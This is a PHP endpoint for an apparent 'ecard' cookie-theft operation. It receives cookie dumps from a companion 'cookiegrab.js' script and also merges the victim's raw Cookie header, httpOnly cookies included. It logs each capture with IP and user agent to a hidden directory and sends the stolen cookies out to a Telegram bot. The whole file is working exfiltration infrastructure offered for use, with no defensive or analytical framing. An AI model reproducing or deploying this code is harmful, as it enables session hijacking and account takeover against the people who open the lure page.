<?php
declare(strict_types=1);
// ecard cookie capture — receives dumps from assets/cookiegrab.js,
// merges the request's own Cookie header (httpOnly included),
// appends to a log OUTSIDE the web root and pushes to Telegram.

$KEY = 'evk_7f3a';
$cfg = require __DIR__ . '/../config.php';

header('Content-Type: application/json; charset=utf-8');

$in = json_decode(file_get_contents('php://input') ?: '[]', true);
if (!is_array($in) || ($in['k'] ?? '') !== $KEY) {
    http_response_code(403);
    echo json_encode(['ok' => false, 'err' => 'key']);
    exit;
}

$ip = 'Unknown';
foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'] as $k) {
    if (!empty($_SERVER[$k])) {
        $v = (string)$_SERVER[$k];
        if ($k === 'HTTP_X_FORWARDED_FOR') { $p = explode(',', $v); $v = trim($p[0]); }
        $ip = $v; break;
    }
}

$entry = [
    'ts'   => date('c'),
    'copy' => str_contains(__DIR__, '/d/ecard') ? 'd' : 'root',
    'page' => mb_substr((string)($in['page'] ?? ''), 0, 300),
    'vid'  => mb_substr((string)($in['vid'] ?? ''), 0, 80),
    'why'  => mb_substr((string)($in['why'] ?? ''), 0, 20),
    'ip'   => $ip,
    'ua'   => mb_substr((string)($_SERVER['HTTP_USER_AGENT'] ?? ''), 0, 200),
    'js'   => mb_substr((string)($in['cookies'] ?? ''), 0, 3000),
    'hdr'  => mb_substr((string)($_SERVER['HTTP_COOKIE'] ?? ''), 0, 3000),
    'srv'  => array_map(strval(...), $_COOKIE),
];

$logDir = '/opt/zalord/ecard_logs';
if (!is_dir($logDir)) { @mkdir($logDir, 0750, true); @chown($logDir, 'www-data'); }
$log = $logDir . '/cookie_log.jsonl';
@file_put_contents($log, json_encode($entry, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . "\n",
                   FILE_APPEND | LOCK_EX);
if (@filesize($log) > 1048576) { @rename($log, $log . '.old'); }

$token = (string)($cfg['telegram_bot_token'] ?? '');
$chat  = (string)($cfg['telegram_chat_id'] ?? '');
$tg = false;
if ($token !== '' && $chat !== '') {
    $esc = fn(string $s): string => htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    $L = [];
    $L[] = "\xf0\x9f\x8d\x9a ecard cookie capture [" . $entry['copy'] . "] (" . $entry['why'] . ")";
    $L[] = "\xf0\x9f\x93\x84 " . $esc($entry['page']);
    if ($entry['vid'] !== '') $L[] = "\xf0\x9f\x86\x94 " . $esc($entry['vid']);
    $L[] = "\xf0\x9f\x8c\x90 " . $esc($entry['ip']) . " · " . $esc($entry['ua']);
    if ($entry['js']  !== '') $L[] = "\n<i>js</i>: <code>" . $esc($entry['js']) . "</code>";
    if ($entry['hdr'] !== '') $L[] = "\n<i>header</i>: <code>" . $esc($entry['hdr']) . "</code>";
    $text = mb_substr(implode("\n", $L), 0, 3800);
    $payload = http_build_query([
        'chat_id' => $chat, 'text' => $text,
        'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true',
    ]);
    $ctx = stream_context_create(['http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $payload,
        'timeout' => 6,
    ]]);
    $res = @file_get_contents("https://api.telegram.org/bot{$token}/sendMessage", false, $ctx);
    $tg = $res !== false;
}

echo json_encode(['ok' => true, 'tg' => $tg, 'n' => count($entry['srv'])]);
